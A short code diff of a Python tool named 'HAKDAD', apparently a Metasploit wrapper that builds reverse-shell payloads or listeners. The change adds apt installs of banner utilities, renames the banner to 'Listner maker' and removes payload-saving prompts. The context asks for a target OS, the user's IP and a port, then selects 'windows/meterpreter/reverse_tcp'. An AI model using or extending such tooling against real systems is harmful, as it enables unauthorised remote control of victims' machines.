@@ -26,9 +26,13 @@ year = now.year
 ##############################################
 ##############################################
 os.system('clear')
+os.system('apt install figlet -y')
+os.system('apt install lolcat -y')
+os.system('apt install toilet -y')
 os.system("figlet _____________")
+os.system('clear')
 os.system("toilet -f big '   HAKDAD ' -F gay | lolcat")
-os.system("toilet -f big 'Payload maker ' -F gay | lolcat")
+os.system("toilet -f big 'Listner maker ' -F gay | lolcat")
 print ("                                                     --version 1.0")
 os.system("figlet /\/\/\/\/\/\/\/\/\/\/\/\/\/////////////////")
 print
@@ -41,9 +45,6 @@ os = raw_input("""\033[94m[*] \033[91mPLEASE \033[91mENTER TARGET OPERATING SYST
                                        
 ip_address = raw_input("\033[94m[*] \033[91mPLEASE \033[91m>> ENTER Your IP Address : \033[97m>>> \033[93m")
 port_given = raw_input("\033[94m[*] \033[91mPLEASE \033[91m>> ENTER Port Number     : \033[97m>>> \033[93m")
-save_directory = "/root/hakdad_generated_payloads"
-name = raw_input("\033[94m[*] \033[91mPLEASE \033[91m>> ENTER Payload Name: \033[97m>>> \033[93m")
-
 
 if os == "1":
 	payload = "windows/meterpreter/reverse_tcp"
